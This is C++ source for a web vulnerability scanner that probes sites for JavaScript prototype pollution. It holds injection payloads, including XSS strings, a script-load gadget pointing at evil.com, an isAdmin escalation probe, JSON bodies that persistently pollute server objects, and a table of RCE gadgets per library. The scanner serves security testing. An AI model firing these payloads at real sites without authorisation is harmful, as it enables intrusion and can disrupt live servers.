/// @file scanners/prototype_pollution_deep.cpp
/// @brief Comprehensive Prototype Pollution Scanner
///
/// Detects both client-side and server-side prototype pollution with
/// gadget chain analysis and behavioral verification.
///
/// Detection Strategy:
/// 1. Identify injection vectors (URL params, JSON body, query string)
/// 2. Inject canary properties via __proto__ / constructor.prototype
/// 3. Detect if pollution propagates (behavioral differential)
/// 4. Identify exploitable gadgets (XSS sinks, privilege escalation)
/// 5. Chain with known frameworks for maximum impact
///
/// False Positive Prevention:
/// - Baseline comparison (property must NOT exist before injection)
/// - Differential testing (inject unique canary, verify in separate request)
/// - Framework-aware (skip if property naturally exists in response)
///
/// References:
/// - https://portswigger.net/research/server-side-prototype-pollution
/// - BlackHat 2023: "Prototype Pollution in the Wild"
#include <random>
#include <regex>

#include "scanner_base.hpp"

namespace apex {
namespace {

/// Generate a unique canary value for this scan.
std::string gen_canary() {
  static std::mt19937 rng(std::random_device{}());
  return "apex" + std::to_string(rng() % 9999999);
}

// ============================================================
// CLIENT-SIDE PROTOTYPE POLLUTION
// ============================================================

/// Detect client-side PP via URL parameters.
/// Tests if URL query/fragment params merge into Object.prototype.
std::vector<Finding> scan_pp_client_url(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Only test pages with JavaScript
  auto baseline = http.get(base);
  if (baseline.body.find("<script") == std::string::npos) return findings;

  std::string canary = gen_canary();

  // Injection vectors for URL-based prototype pollution
  struct PPVector {
    std::string payload;
    std::string technique;
  };

  std::vector<PPVector> vectors = {
      {"?__proto__[" + canary + "]=true", "query __proto__ bracket"},
      {"?__proto__." + canary + "=true", "query __proto__ dot"},
      {"?constructor[prototype][" + canary + "]=true", "query constructor.prototype"},
      {"?constructor.prototype." + canary + "=true", "query constructor.prototype dot"},
      {"#__proto__[" + canary + "]=true", "fragment __proto__"},
      {"?__proto__[innerHTML]=<img+src+onerror=alert(1)>", "query __proto__ innerHTML gadget"},
      {"?__proto__[srcdoc]=<script>alert(1)</script>", "query __proto__ srcdoc gadget"},
      {"?__proto__[src]=//evil.com/xss.js", "query __proto__ src gadget"},
      {"?__proto__[onload]=alert(1)", "query __proto__ onload gadget"},
      {"?__proto__[isAdmin]=true", "query __proto__ privilege escalation"},
  };

  for (const auto& vec : vectors) {
    auto resp = http.get(base + vec.payload);
    if (resp.status_code != 200) continue;

    // Detection method 1: canary reflected in response (rare but definitive)
    if (resp.body.find(canary) != std::string::npos && baseline.body.find(canary) == std::string::npos) {
      findings.push_back(Finding{"Prototype Pollution — Client-Side URL (" + vec.technique + ")", "high", base + vec.payload,
                                 "Canary property '" + canary + "' injected via " + vec.technique +
                                     " appears in response. Object.prototype is pollutable from URL.",
                                 "__proto__", vec.payload, "Canary reflected — pollution confirmed"});
      return findings;
    }

    // Detection method 2: response differs in a meaningful way
    // (e.g., admin UI elements appear, error messages change)
    if (vec.payload.find("isAdmin") != std::string::npos) {
      if (resp.body.size() > baseline.body.size() + 200 &&
          (resp.body.find("admin") != std::string::npos || resp.body.find("Admin") != std::string::npos) &&
          baseline.body.find("admin") == std::string::npos) {
        findings.push_back(
            Finding{"Prototype Pollution → Privilege Escalation", "critical", base + vec.payload,
                    "Setting __proto__[isAdmin]=true causes admin content to appear. "
                    "Client-side authorization relies on pollutable object properties.",
                    "__proto__[isAdmin]", "true",
                    "Response gained " + std::to_string(resp.body.size() - baseline.body.size()) + " bytes + admin indicators"});
        return findings;
      }
    }
  }

  return findings;
}

// ============================================================
// SERVER-SIDE PROTOTYPE POLLUTION
// ============================================================

/// Detect server-side PP via JSON body injection.
/// Targets Node.js/Express apps that use deep merge on request body.
std::vector<Finding> scan_pp_server_json(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  std::string canary = gen_canary();

  // Find endpoints that accept JSON POST/PUT
  std::vector<std::string> json_endpoints;
  for (const auto& url : crawl.urls) {
    if (url.find("api") != std::string::npos || url.find("graphql") != std::string::npos) {
      json_endpoints.push_back(url);
    }
  }

  // Also try common API paths
  std::vector<std::string> common = {base + "/api/user",    base + "/api/profile", base + "/api/settings",
                                     base + "/api/v1/user", base + "/api/account", base + "/api/preferences"};
  json_endpoints.insert(json_endpoints.end(), common.begin(), common.end());

  for (const auto& endpoint : json_endpoints) {
    // Technique 1: __proto__ in JSON body
    std::string pp_body = R"({"__proto__":{")" + canary + R"(":"polluted"}})";
    auto resp = http.post(endpoint, pp_body, "application/json");

    if (resp.status_code == 200 || resp.status_code == 201) {
      // Check if a subsequent request shows the polluted property
      auto verify = http.get(endpoint);
      if (verify.body.find(canary) != std::string::npos) {
        findings.push_back(Finding{"Server-Side Prototype Pollution — JSON Body", "critical", endpoint,
                                   "Injecting __proto__ via JSON body pollutes server-side Object.prototype. "
                                   "Property '" +
                                       canary +
                                       "' persists across requests. "
                                       "Enables RCE via known Node.js gadgets (child_process, ejs, pug, etc).",
                                   "__proto__", pp_body, "Canary found in subsequent GET — pollution persists server-side"});
        return findings;
      }
    }

    // Technique 2: constructor.prototype in JSON
    std::string cp_body = R"({"constructor":{"prototype":{")" + canary + R"(":"polluted"}}})";
    auto resp2 = http.post(endpoint, cp_body, "application/json");

    if (resp2.status_code == 200 || resp2.status_code == 201) {
      auto verify2 = http.get(endpoint);
      if (verify2.body.find(canary) != std::string::npos) {
        findings.push_back(Finding{"Server-Side Prototype Pollution — constructor.prototype", "critical", endpoint,
                                   "constructor.prototype injection pollutes Object.prototype server-side.", "constructor.prototype",
                                   cp_body, "Canary persists across requests"});
        return findings;
      }
    }
  }

  return findings;
}

/// Detect server-side PP via status code / behavior change.
/// PortSwigger technique: pollute status/statusCode to detect non-reflected PP.
std::vector<Finding> scan_pp_server_status(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Find JSON endpoints
  std::vector<std::string> endpoints;
  for (const auto& url : crawl.urls) {
    if (url.find("api") != std::string::npos) endpoints.push_back(url);
  }
  endpoints.push_back(base + "/api/user");
  endpoints.push_back(base + "/api/v1/user");

  for (const auto& endpoint : endpoints) {
    // Baseline
    auto baseline = http.post(endpoint, "{}", "application/json");
    if (baseline.status_code == 404) continue;

    // Technique: pollute "status" property — if server uses obj.status for response code
    std::string payload = R"({"__proto__":{"status":555}})";
    auto resp = http.post(endpoint, payload, "application/json");

    if (resp.status_code == 555 && baseline.status_code != 555) {
      findings.push_back(Finding{"Server-Side Prototype Pollution — Status Code Manipulation", "critical", endpoint,
                                 "Polluting __proto__.status changes HTTP response code from " + std::to_string(baseline.status_code) +
                                     " to 555. "
                                     "Confirms server-side prototype pollution. "
                                     "Escalation: pollute shell/execPath/env for RCE.",
                                 "__proto__", payload, "Status changed: " + std::to_string(baseline.status_code) + " → 555"});
      return findings;
    }

    // Technique: pollute "json spaces" — Express.js specific
    // If Express uses JSON.stringify with app settings from prototype
    std::string spaces_payload = R"({"__proto__":{"json spaces":"  "}})";
    auto resp2 = http.post(endpoint, spaces_payload, "application/json");

    // Send normal request after — check if JSON is now indented
    auto after = http.get(endpoint);
    if (after.body.find("  ") != std::string::npos && after.body.find("{") == 0 && baseline.body.find("  ") == std::string::npos) {
      findings.push_back(Finding{"Server-Side Prototype Pollution — Express JSON Spaces", "high", endpoint,
                                 "Polluting __proto__['json spaces'] causes Express to indent JSON responses. "
                                 "Confirms prototype pollution on Express.js. "
                                 "Escalation: pollute 'shell', 'execPath', or 'env' for RCE.",
                                 "__proto__", spaces_payload, "JSON indentation appeared after pollution"});
      return findings;
    }
  }

  return findings;
}

// ============================================================
// GADGET DETECTION
// ============================================================

/// Identify exploitable gadgets in the JavaScript code.
/// If we find prototype pollution + a gadget = confirmed critical chain.
std::vector<Finding> scan_pp_gadgets(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  auto resp = http.get(base);

  // Known gadget patterns that convert PP to XSS/RCE
  struct Gadget {
    std::string indicator;
    std::string name;
    std::string exploit_property;
    std::string severity;
  };

  std::vector<Gadget> gadgets = {
      // Client-side XSS gadgets
      {"sanitize-html", "sanitize-html bypass", "__proto__[allowedTags]", "high"},
      {"DOMPurify", "DOMPurify bypass (older versions)", "__proto__[ALLOWED_TAGS]", "high"},
      {"lodash", "lodash template RCE", "__proto__[sourceURL]", "critical"},
      {"underscore", "underscore template", "__proto__[template]", "high"},
      {"handlebars", "Handlebars RCE", "__proto__[main]", "critical"},
      {"pug", "Pug template RCE", "__proto__[block]", "critical"},
      {"ejs", "EJS template RCE", "__proto__[outputFunctionName]", "critical"},
      {"jQuery", "jQuery XSS gadget", "__proto__[innerHTML]", "high"},
      {"backbone", "Backbone XSS", "__proto__[template]", "high"},
      {"vue", "Vue template injection", "__proto__[v-html]", "high"},
      {"angular", "Angular template injection", "__proto__[ng-bind-html]", "high"},
      // Server-side RCE gadgets (Node.js)
      {"express", "Express RCE via shell", "__proto__[shell]", "critical"},
      {"child_process", "child_process RCE", "__proto__[execPath]", "critical"},
      {"node-serialize", "node-serialize RCE", "__proto__[rce]", "critical"},
  };

  std::vector<std::string> detected_gadgets;

  for (const auto& gadget : gadgets) {
    if (resp.body.find(gadget.indicator) != std::string::npos) {
      detected_gadgets.push_back(gadget.name + " (via " + gadget.exploit_property + ")");
    }
  }

  // Also check JS files for vulnerable libraries
  std::regex js_re(R"x(src=["']([^"']*\.js(?:\?[^"']*)?)["'])x");
  std::sregex_iterator it(resp.body.begin(), resp.body.end(), js_re);
  std::sregex_iterator end;

  for (int checked = 0; it != end && checked < 5; ++it, ++checked) {
    std::string js_url = (*it)[1].str();
    if (js_url[0] == '/') js_url = base + js_url;
    auto js_resp = http.get(js_url);

    for (const auto& gadget : gadgets) {
      if (js_resp.body.find(gadget.indicator) != std::string::npos) {
        // Check for version — older versions are more vulnerable
        detected_gadgets.push_back(gadget.name + " [in " + js_url.substr(js_url.rfind('/') + 1) + "]");
      }
    }
  }

  if (!detected_gadgets.empty()) {
    std::string gadget_list;
    for (const auto& g : detected_gadgets) gadget_list += "- " + g + "\n";

    findings.push_back(Finding{"Prototype Pollution Gadgets Detected", "medium", base,
                               "The application uses libraries with known prototype pollution gadgets:\n" + gadget_list +
                                   "If prototype pollution is achievable (via URL params or JSON body), "
                                   "these gadgets can escalate to XSS or RCE.",
                               "", "", std::to_string(detected_gadgets.size()) + " gadgets found"});
  }

  return findings;
}

// ============================================================
// VULNERABLE LIBRARY DETECTION
// ============================================================

/// Check for JS libraries with known prototype pollution vulnerabilities.
std::vector<Finding> scan_pp_vulnerable_libs(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  auto resp = http.get(base);

  // Libraries with known PP vulnerabilities and their fixed versions
  struct VulnLib {
    std::string pattern;
    std::string name;
    std::string fixed_version;
  };

  std::vector<VulnLib> vuln_libs = {
      {R"x(lodash[./\-]([0-3]\.\d|4\.[0-9]\.|4\.1[0-6]\.|4\.17\.[0-9]\b|4\.17\.1[0-9]\b))x", "lodash", "4.17.21"},
      {R"x(minimist[./\-](0\.\d|1\.[01]\.\d))x", "minimist", "1.2.6"},
      {R"x(jquery[./\-]([12]\.\d|3\.[0-4]\.))x", "jQuery", "3.5.0"},
      {R"x(merge[./\-]([01]\.\d))x", "merge", "2.1.1"},
      {R"x(deepmerge[./\-]([0-3]\.\d))x", "deepmerge", "4.2.2"},
      {R"x(hoek[./\-]([0-5]\.\d))x", "hoek", "6.1.3"},
      {R"x(qs[./\-]([0-5]\.\d|6\.[0-4]\.))x", "qs", "6.5.3"},
      {R"x(undefsafe[./\-]([01]\.\d|2\.[01]\.))x", "undefsafe", "2.0.3"},
  };

  for (const auto& lib : vuln_libs) {
    std::regex re(lib.pattern);
    if (std::regex_search(resp.body, re)) {
      findings.push_back(Finding{"Vulnerable Library — " + lib.name + " (Prototype Pollution)", "medium", base,
                                 lib.name + " version below " + lib.fixed_version +
                                     " detected. "
                                     "This version is vulnerable to prototype pollution. "
                                     "If user input reaches merge/extend functions, PP is exploitable.",
                                 "", lib.name, "Fixed in: " + lib.fixed_version});
    }
  }

  return findings;
}

}  // namespace

std::vector<Scanner> register_prototype_pollution_deep_scanners() {
  return {
      {"PP Client URL", scan_pp_client_url}, {"PP Server JSON", scan_pp_server_json},         {"PP Server Status", scan_pp_server_status},
      {"PP Gadgets", scan_pp_gadgets},       {"PP Vulnerable Libs", scan_pp_vulnerable_libs},
  };
}

}  // namespace apex
